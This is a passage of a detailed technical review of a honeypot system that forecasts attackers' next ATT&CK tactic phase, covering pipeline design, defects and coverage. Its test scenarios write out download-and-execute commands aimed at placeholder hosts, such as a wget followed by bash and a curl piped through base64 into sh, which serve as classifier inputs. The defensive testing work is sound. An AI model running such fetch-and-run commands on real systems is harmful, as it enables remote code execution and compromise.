# Next-tactic runtime and coverage review — 2026-07-30

This is a read-only, implementation-grounded review. No prediction code,
policy, model, database row, service, deployment, or Raspberry Pi state was
changed. Evidence-scope labels used below are the labels required by the review
request.

## 1. Executive answer

**[ACTIVE_GCP_RECOVERY, LOCAL_HEAD, PREVIOUS_RELEASE, ISOLATED_RUNTIME]** The
deployed subsystem is an event-driven, advisory Transformer forecast of the
**next distinct trusted ATT&CK-derived behavior-phase tactic set, or session
end**. It is not a predictor of the next command, literal operation, completed
technique, completed tactic, attacker objective, or real-host effect.

The effective design is a combination of:

- Design 2: adjacent identical trusted tactic sets are compressed;
- Design 5: every configured prediction trigger reruns inference against the
  current bounded session state, even when the resulting tensor is unchanged.

There is no explicit phase-completion event and no phase inactivity timeout.
A phase boundary is inferred only when the next trusted observation group has a
different sorted tactic set. That is an observed label transition, not proof
that a command, objective, technique, or tactic completed.

Every non-empty `cowrie.command.input`, `.success`, or `.failed` event is sent
through classification and matches the prediction trigger prefix. Every
successfully processed unique trigger normally creates an outbox task and a
snapshot, including explicit `insufficient_history` snapshots. It is **not**
true that every command changes the model tensor or probabilities. Scenario A
proved that a fourth same-tactic command changed the evidence-bound
`model_input.input_hash`, while the actual `tensor_hash` and output were
identical. There is no unchanged-input inference or snapshot deduplication.

**[ACTIVE_GCP_RECOVERY, READ_ONLY_PRODUCTION_DATA]** Current Transformer-v3
production evidence contained 94 snapshots across 16 sessions: 48 `predicted`
and 46 `insufficient_history`. All 60 current prediction-outbox rows were
`completed`. Of 49 command events at or after the first current-v3 snapshot's
ingest boundary, 48 had a current-v3 snapshot and one did not; the reason for
the unmatched event is `NOT_DETERMINABLE` from the retained aggregate fields.

The largest correctness defects are:

1. latest-snapshot selection uses snapshot creation time, not an evidence
   cutoff, so an older delayed task can appear current;
2. late source-timestamp evidence is appended in durable arrival order and can
   fail the non-decreasing prediction-history contract rather than rebuild a
   causal history;
3. `cowrie.command.failed` and unknown-outcome commands can create trusted
   tactic phases because command outcome is not an input-trust condition;
4. direct Cowrie transfers affect only a context bit, while a `wget`/`curl`
   attempt can create T1105/Command-and-Control history;
5. multi-operation fragments from one compound command become one unordered
   tactic-set phase, losing operation order;
6. the immutable training receipt records trust-policy SHA-256
   `1e351858…`, while current runtime is bound to `e4fcf976…`; the training
   receipt includes 546 trusted SecureBERT labels, whereas current
   `production/classification/trust.py` requires explicit reviewed model
   authority that the classifier does not emit. This is a small but real
   train/serve trust-policy mismatch.

For a controlled thesis demonstration, the path is usable only with exact,
advisory terminology and the published severe class-coverage limitations. It
is not suitable for operational decisions or automatic response.

## 2. Verified revision and evidence scope

| Item | Verified value | Scope and conclusion |
|---|---|---|
| Branch | `professor-approved-poc-evaluation` | `LOCAL_HEAD` |
| Local HEAD before this report | `905078ccc442699fe99b8c3787192cb7ac8488d0` | `LOCAL_HEAD`; clean before report |
| Active GCP release link | `/opt/honeypot-releases/19afabd0bb7ed82ac93767301bb0cb1024d0b92e` | `ACTIVE_GCP_RECOVERY`; source revision matches full name |
| Staged candidate | `6964d54326ba59a51cffb2f0d13d9a5b1bd858f2` | `STAGED_CANDIDATE`; never successfully activated; live behavior `NOT_DETERMINABLE` |
| Previous GCP release | `325d136a35f4e9b6cf197cc05565a0798f7b3e14` | `PREVIOUS_RELEASE` |
| Pi sanitizer implementation | `7f764ab471e8dac555d06277b4613237299aee69` | receipt and live link verified; no Pi mutation |
| Active release tree SHA-256 | `a595efaac5b7b09d9a435e26ed46c9dc96fb8662de0fad11fd48c1494ff69142` | `ACTIVE_GCP_RECOVERY` |
| Active release manifest SHA-256 | `46ef29d47807e48aca7cdddd6086904381a9db250a169521237ed2903d4cbd76` | `ACTIVE_GCP_RECOVERY` |
| Candidate tree / rebuilt manifest SHA-256 | `0cfe15d6971aebfb8e632bc3bf2c0506dc1a776e488881c84d3bc12022d3a157` / `d7ce3a584dc195e893b429658e6fab4232b601d61ed5ad632b0210ff4fa87b01` | `STAGED_CANDIDATE` |
| Previous tree / manifest SHA-256 | `96d7f71ddb165cac3825ce6b8d4a7c9cbf618b96936353e9ebde7a519d3f73a1` / `362a0ea361c0b819dcdb69f2a476d67ac2d54d76fdef84302e0b86feaf950f0e` | `PREVIOUS_RELEASE` |
| SQLite | `/var/lib/honeypot/production_pilot.db`, schema/user version 3, mode `0600`, owner `honeypot` | `ACTIVE_GCP_RECOVERY, READ_ONLY_PRODUCTION_DATA` |

Direct tree comparisons found no prediction code, policy, model-binding,
classifier-rule, API, storage, or monitor differences among previous release,
recovery, candidate, and local HEAD. `325d136… → 19afabd…` changes
`production/reporting/feedback_review.py` plus its test; the prediction tree is
identical. Candidate and local changes likewise do not touch prediction paths.
This establishes **code-identical**, not live-behavior-verified, for the
candidate. Active live/isolated evidence belongs to `19afabd…`.

The active session worker used:

- `PREDICTION_POLICY_PATH=/opt/honeypot/configs/prediction_policy.transformer_poc.trusted.json`;
- `CLASSIFICATION_RULES_PATH=/opt/honeypot/configs/classification_rules.trusted.json`;
- `MITRE_ATTACK_PATH=/var/lib/honeypot/feeds/mitre_attack_cache.json`;
- frozen SecureBERT under `/opt/honeypot/models/securebert_ttp`.

The initial isolated shell lacked the systemd-only MITRE environment and
therefore projected valid techniques to `unknown`. Repeating with the exact
non-secret service paths loaded 625 ATT&CK techniques, version 14.1, and
reproduced the active mappings. That failed first attempt is evidence that the
MITRE path is a required runtime configuration, not model behavior.

## 3. Exact runtime pipeline

| Step | Code and function | Input → output, identity/order, failure and authority |
|---|---|---|
| Cowrie persistence | `production/cowrie_output/sanitized_jsonlog.py`; `production.utils.cowrie_privacy.sanitize_cowrie_event_for_persistence` | Cowrie event → privacy-policy-bound sanitized NDJSON. Sanitization fails closed. Pi receipt policy SHA-256 `439c11f1…`. |
| Pi forwarding | `production/workers/sensor_forwarder.py`: `CowrieLogTailer`, `DiskSpool.append_many`, `forward_once` | Sanitizes again before durable spool; offset advances only after spool fsync; spool is shortened only after complete server acknowledgement. |
| GCP ingest | `production/api/ingest_api.py`: `IngestHandler.do_POST` | Bearer-authenticated, bounded strict JSON envelope; validates event and sanitizes again; calls `store_event`. Invalid/oversized records are rejected. |
| Durable event | `production/storage/backend.py`: `SQLiteStorage.store_event` | `event_id = stable_id("evt", {"sensor_id", "event"})`; `INSERT OR IGNORE`; exact transport retry returns the same ID and `inserted=false`. |
| Claim/order | `SQLiteStorage.claim_events`, `canonical_event_prefix` | Per-session head-of-line order and global claim order are `received_at, event_id`; Cowrie `timestamp` is payload metadata, not the durable ordering key. |
| Session state | `production/workers/session_worker.py`; `SessionMonitor.on_event` | Applies every unique claimed event, retains bounded sanitized `raw_events`, commands, and classification events; durable event prefix remains reconstruction authority. |
| Classification | `SessionMonitor._classify_many_with_source`; `NotebookParityClassifier.classify` | Non-empty command input/success/failure → conservative shell fragments → reviewed regex matches plus SecureBERT candidate/agreement metadata. |
| Trust | `production/classification/trust.py`; `normalize_classifier_outputs` | Rule-only and exact agreement can be trusted; disagreement, emergency fallback, shell noise, low confidence, unavailable/unclassified, opaque probes, and non-authorized model-only candidates are audit-only. |
| Tactic projection | `NotebookParityClassifier._tactic`; MITRE cache | Technique → the first tactic returned by the pinned ATT&CK cache. Classifier event stores technique, tactic, source, agreement, confidence, policy provenance, outcome and evidence ID. |
| Trigger | `SessionWorker._prediction_trigger_for_event` | Exact event IDs plus `cowrie.command.` prefix decide only prediction outbox creation. Non-trigger events still update session state. |
| Safe history | `build_live_next_behavior_session` | Classification events grouped by event type/evidence fallback, timestamp and compound index; groups lacking trusted labels disappear; trusted labels become pseudonymous refs. |
| Phases | `build_behavior_phases` | Adjacent equal sorted tactic sets are run-length compressed; techniques/evidence/provenance are unioned within a run. |
| Model input | `build_live_model_input`; `tensorize_model_input` | Last eight phases, left zero padding and attention mask; multi-hot tactic/technique/provenance fields plus categorical repetition, elapsed time, audit count and session context. |
| Inference | `FrozenTransformerPocPredictor.predict_session` | No trusted phase → v3 `insufficient_history`; artifact/input error → `model_unavailable`; otherwise calibrated Transformer inference. No VOMM fallback. |
| Outbox/snapshot | `_save_prediction_snapshot_unobserved`, `_drain_prediction_outbox`, storage methods | Content-addressed outbox task, leased retry, then `prediction_snapshot.v3`; prediction alert is always prohibited. |
| API/UI | `dashboard_api.py`, `monitor_web.py`, `static/monitor.html` | `/predictions/current` uses latest storage row; monitor session detail also includes snapshot rows. UI identifies output as advisory/non-authoritative. |

**[ACTIVE_GCP_RECOVERY, LOCAL_HEAD]** Typed semantic facts, hypotheses,
guidance, enrichment, correlations, and optional prose are not Transformer
inputs. Predictions are `advisory_only=true`, cannot establish intent, cannot
create an alert, and cannot select findings, hypotheses, guidance, or actions.

## 4. Trigger and update timeline

Configured exact triggers are:

`cowrie.login.success`, `cowrie.login.failed`,
`cowrie.session.file_download`, `cowrie.session.file_upload`,
`cowrie.session.closed`, and every event ID beginning `cowrie.command.`.

For a unique trigger event the normal sequence is:

1. SQLite claim in `received_at,event_id` order;
2. `SessionMonitor.on_event`;
3. trigger evaluation;
4. content-addressed `prediction_outbox_task.v1` enqueue;
5. immediate drain attempt;
6. fresh inference over the task's captured session payload;
7. snapshot save;
8. outbox completion;
9. session/event completion.

Every command trigger initiates this path, but a storage/claim failure, an
already-deduplicated event, or an exhausted/dead outbox can prevent a new
snapshot. The outbox retries up to the configured five attempts using
exponential 10–600 second delays and leases. Production currently had no
queued/retry/in-progress/dead rows.

There is no input-hash check before inference. An unknown command after trusted
history can therefore create a new snapshot even if history is unchanged; its
command-count context bucket may or may not change the tensor. A same-tactic
command always changes evidence refs and the content-addressed model-input hash,
but it changes the tensor only when a model-visible bucket, technique union,
phase feature, or context field changes.

## 5. Prediction policy and model contract

**[ACTIVE_GCP_RECOVERY, LOCAL_HEAD, PREVIOUS_RELEASE]**

| Contract item | Exact value |
|---|---|
| Policy ID / version | `professor-approved-corrected-target-transformer-poc` / `2026-07-27-frozen-seed-20260721` |
| Mode | `professor_approved_corrected_target_transformer_poc` |
| Target | `next_distinct_command_behavior_phase_or_session_end.v1` |
| Architecture | 1 causal layer, `d_model=16`, 4 heads, FF=32, GELU, dropout 0.1, last-unmasked-phase readout, CPU float32, 3,951 parameters |
| Maximum sequence | 8 phases; most recent eight retained |
| Padding | left zero rows; attention mask `0` for padding, `1` for phases |
| Phase target | independent multi-label tactic logits |
| Terminal target | separate independent binary logit `session_end_no_further_trusted_behavior`; not a tactic token |
| Decoding | scalar-temperature sigmoid; terminal ≥0.5 takes precedence; otherwise tactics ≥0.5; if none pass, select highest-ranked tactic |
| Runtime abstention | `insufficient_history` only when no trusted phase; `model_unavailable` on disabled/missing/invalid artifact or invalid input; no calibrated/OOD/low-probability abstention after valid inference |
| Fallback | none in this policy; VOMM exists only as an explicitly selected rollback mode |

Tactic label order is:

`collection`, `command-and-control`, `credential-access`,
`defense-evasion`, `discovery`, `execution`, `exfiltration`, `impact`,
`initial-access`, `lateral-movement`, `persistence`,
`privilege-escalation`, `reconnaissance`, `resource-development`.

Technique vocabulary contains `<UNK>` plus 22 techniques:
T1003, T1016, T1033, T1049, T1053, T1057, T1059, T1070, T1078,
T1082, T1083, T1098, T1105, T1110, T1136, T1140, T1222, T1529,
T1543, T1546, T1548, T1562.

Frozen identities:

| Artifact | SHA-256 |
|---|---|
| prediction policy file | `3861d6a6edad4d15e147213cf0c4a5e8fb6c74f2a5f90142526df31492ddd90c` |
| Transformer checkpoint | `7fbd73c4bd071336fa52a589bf41e39f5a3122a67aee398dfb8e6dd9cfdfb04a` |
| model-spec file | `2f4ea5531ce08adbd78f53832d7a6e23ba34617549c56aa50f04d069dee6ccc6` |
| vocabulary file / semantic | `1b46db302d2a92f80f1385e63fa01968cc23a9ce50cb77ef24f20ce8a9e494e9` / `527a65c6d6cee94a3bbb0af6d5df95981a6438cf703e053484c9e7e116f0306f` |
| preprocessing | `890569a4597df2f300d7c885a2cf0bd34a9fd9fbdd0ab0938141a8f13f4a25c1` |
| calibration file / semantic | `528bbdd8f21d7e0a5f4446657639ccbc994b9d469876e8f026eb716e9a8d7cc9` / `aa27813af96eaa2674b07d76f41565e71835bfa1a5bba8a3232eaa0a396a4e2d` |
| runtime rule policy | `33f332946c53578f2e609a3a039dda712355b9e209721bcc073c61a623d6342b` |
| current runtime trust code | `e4fcf976a18e079a493fcab0472bb220d42e42512a8ae78dc9ccb52799c38b39` |
| SecureBERT checkpoint | `dc3a4e2a57a70c4c7cb5f769b6399f32b2b51f0245025653e0b72f6d025a759b` |
| immutable final evaluation | `3e82ccd46dd1114488e8e8c7cfc45522ded38ed580969f853687b233e5440c08` |
| frozen bundle manifest | `609ab334bb5c75295eee2851e2b2b6ae103ce8e0dbc6e43219da8bb5221e4419` |

The release resolves SecureBERT through immutable bundle
`/opt/honeypot-model-bundles/frozen_model_bundle_4957…`, not an older release.
The 599,036,536-byte checkpoint is mode `0600`, owned by
`honeypot:honeypot`. Local `ProductionConfig` defaults to
`configs/prediction_policy.trusted.json` (VOMM rollback); the checked example
and deployed environment explicitly select Transformer. Running locally
without the explicit production environment is therefore not evidence of
deployed behavior.

## 6. Tactic-history construction

`build_live_next_behavior_session` consumes only
`session_payload.classification_events`. The grouping key is
`(cowrie_eventid or evidence_id or index, event_timestamp,
compound_command_index)`. It normalizes trust again, drops groups with no
trusted labels, pseudonymizes evidence refs, sorts labels, and constructs
observation groups. The current implementation hard-codes each emitted group's
`audit_only_labels=[]` and the session `audit_summary` to zero, so unsupported
commands are not visible inside the model history.

Within a trusted group:

- tactic and technique values are unique sorted lists;
- label provenance is sorted by tactic, technique, source, evidence ref;
- multiple labels are simultaneous members of one observation, not sequential
  operations;
- failed/unknown command outcome is absent from trust and model features.

`build_behavior_phases` compares the entire sorted tactic tuple of each
adjacent group. Equal adjacent tuples merge. Technique sets, evidence refs,
provenance, observation count and elapsed span are aggregated. A later return
to the same tactic after another set remains a separate phase.

The model input contains evidence refs and an input hash, but the tensor
deliberately drops evidence identities. Thus:

- new evidence can always change `model_input.input_hash`;
- the tensor can remain identical if all learned features stay in the same
  categorical/multi-hot state;
- snapshots retain the model-input hash, sequence length, truncation and input
  evidence refs, but not the full phase sequence or `tensor_hash`.

## 7. Phase-boundary semantics

**[LOCAL_HEAD, ACTIVE_GCP_RECOVERY, ISOLATED_RUNTIME]**

- A phase begins at the first trusted observation group.
- It extends while the next trusted group's tactic set is exactly equal.
- It ends only retrospectively when a different trusted tactic set appears.
- No Cowrie event explicitly means “tactic complete.”
- No inactivity timer closes a phase.
- `cowrie.session.closed` does not append a phase token.
- Session end is a training/output target, not an observed input token.

Therefore “phase” means an adjacent run of equal trusted ATT&CK tactic sets.
It must not be described as completed attacker work.

## 8. Same-tactic repetition results

**[ISOLATED_RUNTIME using ACTIVE_GCP_RECOVERY artifacts]**

| Event | Reviewed result | Phase | Input hash / tensor hash | Forecast |
|---|---|---|---|---|
| `uname -a` | T1082 Discovery; rule/SecureBERT agreement 0.6499 | Discovery, count 1, repetition `1` | `nextbehaviorinput_65f3…` / `nextbehaviortensor_60f6…` | terminal, 0.995444 |
| `hostname` | T1082 Discovery; agreement 0.5763 | Discovery, count 2, repetition `2` | `nextbehaviorinput_7661…` / `nextbehaviortensor_734b…` | terminal, 0.998283 |
| `id` | T1033 Discovery; reviewed rule | Discovery, count 3, techniques T1033+T1082, repetition `3-5` | `nextbehaviorinput_a335…` / `nextbehaviortensor_6cf9…` | terminal, 0.998067 |
| `uname -a` again | T1082 Discovery | Discovery, count 4; same model-visible buckets/technique union | `nextbehaviorinput_de40…` / **same** `nextbehaviortensor_6cf9…` | **identical** terminal, 0.998067 |

All four events matched the trigger and inference ran. Four distinct snapshots
were produced. The fourth proves that snapshot/input identity changes due to
new evidence even when the learned tensor and output do not. Dashboard
creation time would advance if persisted.

## 9. Changed-tactic transition results

**[ISOLATED_RUNTIME]**

`uname -a → wget https://example.invalid/review-item -O /tmp/review-item →
bash /tmp/review-item` produced:

1. T1082 / Discovery (`both`) → phase `[Discovery]`, terminal 0.995444;
2. T1105 / Command-and-Control (`rule`; SecureBERT T1204 at 0.3039 was below
   threshold) → `[Discovery, C2]`, terminal 0.563519;
3. T1059 / Execution (`rule`; SecureBERT T1057 at 0.4147 was below threshold)
   → `[Discovery, C2, Execution]`, terminal 0.838496.

Input hashes were `58baa8…`, `0b5b7c…`, and `af3efa…`; tensors were
`60f6c5…`, `69bee7…`, and `18cdaa…`. Every step changed the tensor/output and
wrote a distinct isolated snapshot. Both `wget` and `bash` were
`outcome_unknown` command observations: transfer and execution were attempts,
not confirmed effects.

## 10. Tactic recurrence results

**[ISOLATED_RUNTIME]** `uname -a → wget … → ps aux` produced
`Discovery → Command-and-Control → Discovery`, with T1082, T1105 and T1057.
The final phase was not merged with the first. Input hashes `25ed27…`,
`25c280…`, `12ddf9…`; terminal probabilities 0.995444, 0.563519, 0.787581.
Deduplication is adjacent-only, not global.

## 11. Unknown-command behavior

**[ISOLATED_RUNTIME]** Independently selected
`quuxdiag --mystery /var/empty` had no reviewed rule. SecureBERT proposed
T1564/Defense-Evasion at 0.2682 with source
`securebert_low_confidence`; it was audit-only. With no previous trusted
history the result was a persisted-form `prediction_snapshot.v3` with status
`insufficient_history`, no input/tensor, empty prediction/ranking, and no VOMM
fallback.

After existing trusted history, the same kind of unsupported command would
preserve the phase sequence. It would still trigger inference and a snapshot;
only command-count context can change a learned feature. The snapshot contract
does not explicitly distinguish “unsupported new command” from “same prior
trusted history.”

## 12. Multi-label behavior

**[ISOLATED_RUNTIME]** `curl https://example.invalid/review-b64 | base64 -d |
sh` was not split at pipes. Two reviewed regexes matched the same fragment:
T1140/Defense-Evasion and T1105/Command-and-Control. They became one
deterministically sorted tactic-set phase:

`["command-and-control", "defense-evasion"]`,
techniques `["T1105", "T1140"]`.

Input/tensor were `nextbehaviorinput_ef291c…` /
`nextbehaviortensor_d69e12…`; terminal probability 0.688245. This preserves
set membership but not pipeline order and permits partial trusted
classification even when unparsed/unsupported syntax remains in the same raw
fragment.

## 13. Direct-transfer versus transfer-attempt behavior

**[ISOLATED_RUNTIME]**

| Evidence | Classification/history | Model consequence |
|---|---|---|
| `wget https://example.invalid/review-item -O /tmp/review-item` command | Reviewed T1105/Command-and-Control, `outcome_unknown`; creates a trusted phase despite being only an attempt | terminal 0.989379; tensor `0c15ce…` |
| `cowrie.session.file_download` with exact synthetic SHA-256 | No command classification and no tactic group; durable raw event flips `confirmed_transfer_observed=true` | existing C2 phase retained; tensor changed to `431618…`; output changed to next phase `persistence`, terminal probability 0.273738 |

Both event types trigger prediction. The direct event bypasses command
classification and its SHA/evidence identity is retained in raw canonical
evidence, but prediction reduces it to a Boolean context feature. A direct
transfer with no prior trusted command phase returns `insufficient_history`.
Conversely, the command attempt alone can drive history. These paths are not
semantically equivalent.

## 14. Compound-command behavior

**[ISOLATED_RUNTIME]** The safe chain
`uname -a && wget … -O /tmp/review-item; bash /tmp/review-item` is split on
`&&` and `;` into ordered classification fragments T1082, T1105, T1059.
`SessionMonitor` records fragment index/count and a compound-event outcome
scope. The prediction grouping key, however, groups all fragments by the one
command's `compound_command_index`, event type and timestamp. The model sees
one unordered phase set:

- tactics: Command-and-Control, Discovery, Execution;
- techniques: T1059, T1082, T1105;
- input/tensor: `0f7091…` / `cfc7cc…`;
- output: terminal 0.998594.

Unsupported segments do not force whole-command abstention if another segment
has trusted labels. Pipe syntax is not a sequencing delimiter in the
classifier's conservative split, so pipe-dependent semantics can overmatch
regexes and lose order.

## 15. Duplicate and retry behavior

**[LOCAL_HEAD, TEST_ONLY, ISOLATED_RUNTIME]** An isolated normal
`SQLiteStorage.store_event` replay returned the same event ID, inserted the
first row, rejected the second via `INSERT OR IGNORE`, and retained one row for
that identity. The outbox task repeated with the same event/session/mode
returned the same outbox ID and retained one row.

The outbox claims in `created_at,outbox_id` order, leases rows, retries
retryable failures with bounded exponential delay, and records
`completed`, `retry`, `in_progress`, or `dead`. A retry after snapshot save but
before completion is safe against duplicate IDs because snapshot identity is
content-addressed, but `save_prediction_snapshot` uses
`ON CONFLICT(snapshot_id) DO UPDATE`, so the stored row is not physically
immutable: payload and `created_at` may be overwritten on retry.

Focused tests prove deterministic outbox deduplication, lease ownership,
retry timing, attempt exhaustion, session head-of-line blocking and recovery.
No classification or prediction reruns for an exact event duplicate because
the duplicate never becomes a new durable event claim.

## 16. Late-event behavior

**[LOCAL_HEAD, ISOLATED_RUNTIME]** The normal storage API accepted an event
with source timestamp `02:00:10Z`, then a different later-arriving event with
source timestamp `02:00:05Z`. Durable order remained arrival order:
`received_at,event_id`. Passing that retained order through the live history
builder produced:

`NextBehaviorContractError: observation_groups[1].relative_time_ms must be non-decreasing`.

The worker converts that prediction failure to `model_unavailable` and retries
according to error type; it does not chronologically rebuild the session from
Cowrie timestamps or create a corrected evidence-cutoff lineage. Existing
snapshots remain.

The isolated snapshot query also proved that a snapshot generated at
`02:00:12Z` from source evidence `02:00:05Z` is selected over a snapshot
generated at `02:00:11Z` from source evidence `02:00:10Z`.

Therefore:

- late evidence can extend/reconstruct general session state via durable
  arrival order, but not a source-time-sorted prediction history;
- older source evidence can produce a newly generated snapshot that appears
  current;
- an older delayed outbox task can similarly finish after a newer task and
  become latest;
- the latest query has no event sequence/evidence-cutoff field with which to
  reject this.

## 17. Session-close behavior

**[LOCAL_HEAD, ISOLATED_RUNTIME, TEST_ONLY]** `cowrie.session.closed` updates
duration/ended state, triggers a final prediction task, and is processed before
the close analysis job is finalized. It does not add a terminal token to
history. The context/status and age bucket may change the tensor.

In Scenario G, Discovery before close used tensor `60f6c5…`, terminal
0.995444. Close retained the same Discovery phase, used tensor `42bf42…`, and
created a new terminal forecast at 0.981882. The prior snapshot was retained
and was not marked terminal. The latest generated snapshot replaces it in
dashboard selection; it is not removed when the session closes.

“Session end” means the model's predicted class “no further trusted behavior,”
not an observed close marker. On a closed training prefix it is the final
target; at runtime the observed close changes context and prompts another
forecast.

## 18. Snapshot persistence

SQLite `prediction_snapshots` fields are:

`snapshot_id` primary key, `session_id`, `src_ip`, `session_status`,
`event_id`, `features_hash`, `payload_json`, `created_at`.

The v3 payload contains:

- schema, session/event/status and generated time;
- prediction mode and target contract;
- `prediction_status` and reason;
- prediction set, full calibrated ranking and terminal output;
- active model/checkpoint/vocabulary/preprocessing/rule/trust/classifier hashes;
- model-input hash, sequence length, truncation and evidence refs;
- runtime load/inference latency;
- trigger metadata, immutable authority and prohibited predictive alert;
- content-addressed `snapshot_id` and `snapshot_sha256`.

It does **not** persist source-event timestamp as a queryable snapshot field,
an evidence cutoff/sequence number, full phase sequence, tensor content/hash,
or an explicit “same input/output as previous” relation.

`finalize_prediction_snapshot` excludes generated/load/inference timing from
content identity, which makes deterministic re-inference content-addressable.
Storage nevertheless upserts same-ID rows and can replace their generated
timestamp. Multiple distinct snapshots per session are retained. No
unchanged-tensor or unchanged-forecast deduplication exists.

## 19. Prediction outbox behavior

`prediction_outbox` stores `outbox_id`, event/session identity, state,
captured task payload, attempt/retry/lease fields, result `snapshot_id`,
sanitized error code/type/times, and created/updated/completed timestamps.

Identity is a stable hash of event ID, session ID and prediction mode.
Insertion is idempotent. Claims are ordered by `created_at,outbox_id`, but
independent retries can complete out of original event order. The captured
session payload gives each task a fixed computation input; there is no
supersession rule when that input is older than an already completed task.

**[READ_ONLY_PRODUCTION_DATA]** All 60 current outbox rows (2026-07-28
14:28:08Z through 2026-07-30 11:32:10Z) were completed with snapshot IDs.
This proves successful delivery for those rows, not correct evidence ordering.

## 20. Dashboard/API selection

`SQLiteStorage.get_latest_prediction_snapshot(session_id)` runs:

```sql
SELECT * FROM prediction_snapshots
WHERE session_id = ?
ORDER BY created_at DESC
LIMIT 1
```

There is no deterministic secondary sort. `/predictions/current` in both
`dashboard_api.py` and `monitor_web.py` uses this method. The monitor session
detail separately obtains table rows in `rowid DESC` order and chooses its
first row, so the two views can disagree if creation time and insertion order
diverge.

The browser calls the current-prediction endpoint when rendering/opening a
session and calls the snapshot list when entering the Prediction Context page.
The only one-second `setInterval` updates the clock; no automatic prediction
poller was found. The visible result changes on a user/navigation refresh or
other fetch after a newly selected row is persisted. Refresh itself does not
run inference, but a later created identical forecast will show a newer age and
can look like a new forecast.

The API serializes `prediction_status`, reason, ranking, hashes, advisory
authority and prohibited alert. Current corrected-target monitor text says
“primary experimental PoC forecast” and “advisory / non-authoritative,” which
is materially safer than generic legacy fields still supported by adapters.

## 21. Cowrie behavior coverage matrix

This matrix separates observation from prediction. “Output class” means only
that the 14-tactic vocabulary contains the tactic; it does not mean training
support or useful performance.

| Behavior | Cowrie evidence / reaches GCP | Reviewed classifier and typed semantics | Trusted history / forecastability | Evidence meaning |
|---|---|---|---|---|
| connection/session creation, shell start, client KEX/version | session/client events; preserved and ingested | no command classification; context/state only | not a configured prediction trigger except login; cannot create a phase | observed connection metadata |
| login failed/success | direct Cowrie events; triggers | no ATT&CK command classification | can rerun only if prior trusted phase exists; login context encoded | observed honeypot auth outcome, not real-host access |
| command input/success/failure | `cowrie.command.*`; triggers | all non-empty commands classified; typed parser supports documented shell subset | reviewed trusted mappings create phases; outcome does not gate them | command attempt; Cowrie outcome is not real-host effect |
| host/OS/account/process/network/socket/service/filesystem inspection | command evidence | many reviewed Discovery rules; typed `inspection` active for supported operations | can enter Discovery history; vocabulary supports Discovery | attempted/observed command semantics |
| sensitive credential-path read | command evidence | reviewed ATT&CK coverage depends on rule; typed `sensitive_read` active and stricter | prediction only if classification is trusted; Credential Access output has zero held-out recall | read attempt; no credential acquisition proof |
| transfer command attempt | `wget`, `curl`, etc. | reviewed T1105 patterns; typed `transfer_attempt` active | may create C2 phase/output despite attempt-only evidence | attempt |
| direct upload/download | `cowrie.session.file_upload/download`, optional hash; triggers | bypasses command classifier; typed `transfer` active | no tactic phase; only confirmed-transfer context, so alone abstains | Cowrie-observed transfer |
| create/overwrite/append/move/rename/chmod/delete | command evidence | some reviewed ATT&CK regexes; typed `filesystem` active for supported operations | only classifier mappings enter model; many literal operations have no distinct tactic meaning | attempt/Cowrie outcome only |
| execution/interpreter/tool invocation | command evidence | reviewed T1059 and related mappings; typed `execution` active | can create Execution phase; strong held-out class | execution attempt, not confirmed malware execution |
| decode/transform | command evidence | T1140 rules possible; typed `transformation` shadow/not activated | may enter Defense Evasion history; output class had zero held-out recall | attempted transformation |
| archive/collection | command evidence | T1560/Collection rule availability varies; typed `collection` shadow/not activated | Collection is in output vocabulary but absent from final targets | attempted collection/archive |
| scheduled task inspect/modify/delete | command evidence | reviewed T1053 subset; broad rules excluded; typed `scheduled_task` not activated | Persistence phase possible only for reviewed matches | persistence-like attempt, not durable persistence |
| service inspect/modify | command evidence | reviewed/broad-rule split; typed `service` not activated | some Persistence/Discovery mappings possible | attempted service operation |
| cleanup/defense-evasion | command evidence | reviewed T1070/T1562/T1222 etc.; broad rules excluded | can enter relevant tactic; Defense Evasion held-out recall is zero | attempt, not successful evasion |
| pipelines | command input | regexes see complete pipe fragment; typed parser supports only bounded subset | multi-label unordered set; order/effect not modeled | ambiguous compound attempt |
| `&&`, `||`, `;`, newline chains | command input | classifier splits fragments | fragments from one command collapse to one tactic set in prediction | ordered text retained outside model; order lost inside phase |
| redirects, aliases, wrappers, nested interpreters, BusyBox | command input | rule coverage partial; typed subset conservative; opaque BusyBox model probes rejected | reviewed rule only; otherwise audit/no phase | often ambiguous attempt |
| unknown binary/malformed/unsupported syntax | command input | low-confidence/model candidate or unclassified; typed unknown/abstain | trigger can create unchanged forecast or insufficient history | unknown |
| session close/connection loss | close/log event reaches GCP | no command classification; only `session.closed` triggers | final rerun; terminal is output target, not input | observed honeypot session end |

Layers of coverage:

1. The forwarder and ingest preserve a broad Cowrie event envelope.
2. Prediction triggers are a small exact/prefix subset.
3. Only command events are classified.
4. Only enabled reviewed rules or exact trusted agreement can create history.
5. SecureBERT candidates are generally audit-only unless authority conditions
   are satisfied.
6. Typed facts cover more literal operations but are not prediction inputs.
7. The vocabulary enumerates all 14 Enterprise ATT&CK tactics.
8. Training and final evaluation contain only seven tactic classes.
9. The Transformer has meaningful held-out F1 only for Discovery, Execution
   and Persistence.
10. Cowrie observes an emulated interaction. It cannot prove all real Linux
    effects, attacker intent, objectives, or every attack a real host permits.

Consequently the subsystem covers neither every command attackers can type,
nor every Cowrie-observable behavior, nor all real-host attacks.

## 22. Quantitative classification coverage

**Policy corpus [ACTIVE_GCP_RECOVERY, LOCAL_HEAD]:**

- 111 enabled rule records, all `command_regex`, confidence metadata 1.0;
- 84 enabled human-reviewed rules loaded by `rule_review_mode=reviewed_only`;
- 27 enabled but unreviewed rules excluded from runtime matching;
- 30 distinct reviewed techniques; 31 across all enabled records;
- reviewed techniques project to 10 tactics; all enabled records add
  Exfiltration for 11;
- emergency Python rules are used only when no policy path is explicitly
  configured and are audit-only. In production the explicit path is valid, so
  active emergency count is zero;
- frozen MITRE Enterprise ATT&CK version 14.1, 625 techniques, frozen source
  hash `33af47bb0a3475cda60c2bea83ce305244bd747021f9e999652dc21520e4e35c`.

**Current retained production session payloads
[ACTIVE_GCP_RECOVERY, READ_ONLY_PRODUCTION_DATA], queried 2026-07-30; event
range 2024-03-23 through 2026-07-30 11:32:07Z:**

- 7,439 retained sessions and 876 retained command-list entries;
- 1,089 retained classifier output records: source counts `rule=391`,
  `both=161`, `rule_securebert_disagreement=2`, `securebert=94`,
  `securebert_low_confidence=340`, `shell_noise=101`;
- when the **deployed canonical history builder** recomputed current trust:
  176 sessions had usable trusted history, containing 469 trusted observation
  groups compressed to 377 phases; 117 sessions had at least two phases;
  7,263 had no trusted history.

These session percentages are 2.37% usable trusted history, 1.57% at least two
phases, and 97.63% no trusted history, with population defined as current
`sessions.payload_json` rows.

Exact per-command trusted/audit/no-classification percentages are
